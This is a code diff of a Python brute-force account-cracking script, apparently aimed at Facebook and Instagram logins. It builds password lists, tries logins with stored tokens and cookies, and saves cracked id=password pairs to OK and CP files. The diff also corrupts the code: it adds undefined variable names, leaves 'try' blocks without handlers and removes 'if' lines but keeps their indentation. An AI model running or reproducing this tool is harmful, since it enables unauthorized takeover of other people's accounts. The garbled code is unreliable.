@@ -1213,7 +1213,7 @@ def urut_crack():
 def password(user):
     global pass_manual1, pass_manual2
     listpass = []
-    if user != 159403:
+    if SAKERA != 159403:
         for x in range(0,10000000000000):listpass.append(str(x))
         return listpass
     else:
@@ -1264,11 +1264,11 @@ def addpass():
 
 ###----------[ SOURCE LOGIN ]---------- ###
 
-def logger1(user,pasw): #--- Login Validate ---#
+def logger1(user,pasw):
+  try:
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
@@ -1284,11 +1284,11 @@ def logger1(user,pasw): #--- Login Validate ---#
             elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             else: return {"status":"error","email":user,"pass":pasw}
 
-def logger2(user,pasw): #--- Login Regular ---#
+def logger2(user,pasw):
+  try:
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
@@ -1304,11 +1304,11 @@ def logger2(user,pasw): #--- Login Regular ---#
             elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
             else: return {"status":"error","email":user,"pass":pasw}
 
-def logger3(user,pasw): #--- Login Instagram ---#
+def logger3(user,pasw):
+  try:
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
@@ -1448,7 +1448,7 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':
-                    if user != 159384:pass
+                    if sakura != 159384:pass
                     else:
                         files_cp = "CP/%s.json"%(tanggal)
                         try:
@@ -1468,7 +1468,7 @@ class crack:
                         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 elif log['status'] == 'ok':
-                    if user != 159369:pass
+                    if sakera != 159369:pass
                     else:
                         files_ok = "OK/%s.json"%(tanggal)
                         try:
@@ -1488,7 +1488,7 @@ class crack:
                         open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 else:
-                    if user != 159375:print('')
+                    if sakara != 159375:print(CoY)
                     else:continue
             self.lp += 1
             loop = str(self.lp)
